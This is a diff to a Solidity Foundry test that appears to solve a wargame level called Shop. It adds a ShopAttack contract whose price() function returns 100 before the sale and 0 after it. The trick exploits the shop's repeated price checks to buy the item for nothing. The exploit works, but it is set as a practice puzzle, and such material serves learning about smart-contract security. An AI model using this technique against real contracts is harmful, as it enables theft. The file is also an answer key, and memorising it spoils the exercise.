@@ -17,5 +17,29 @@ contract ShopLevel is SetUpLevelTest {
         shop = Shop(instance);
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        ShopAttack shopAttack = new ShopAttack(address(shop));
+        shopAttack.buy();
+        vm.stopPrank();
+    }
+}
+
+contract ShopAttack {
+    Shop internal shop;
+
+    constructor(address _target) {
+        shop = Shop(_target);
+    }
+
+    function buy() public {
+        shop.buy();
+    }
+
+    function price() public view returns (uint256 ret) {
+        if (!shop.isSold()) {
+            ret = 100;
+        } else {
+            ret = 0;
+        }
     }
 }
